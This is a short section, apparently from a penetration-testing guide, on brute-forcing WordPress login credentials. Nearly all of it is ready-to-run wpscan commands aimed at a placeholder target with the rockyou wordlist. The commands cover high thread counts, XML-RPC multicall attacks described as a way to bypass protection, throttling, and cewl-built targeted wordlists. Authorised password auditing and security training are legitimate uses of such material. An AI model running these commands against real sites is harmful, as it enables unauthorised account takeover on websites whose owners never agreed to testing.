# Phase 8: Password Attacks

Brute-force WordPress credentials:

```bash
# Single user brute-force
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# Multiple users from file
wpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt

# With password attack threads
wpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50

# XML-RPC brute-force (faster, may bypass protection)
wpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc

# Brute-force with API limiting
wpscan --url http://target.com -U admin -P passwords.txt --throttle 500

# Create targeted wordlist
cewl http://target.com -w wordlist.txt
wpscan --url http://target.com -U admin -P wordlist.txt
```

Password attack methods:
- `wp-login` - Standard login form
- `xmlrpc` - XML-RPC multicall (faster)
- `xmlrpc-multicall` - Multiple passwords per request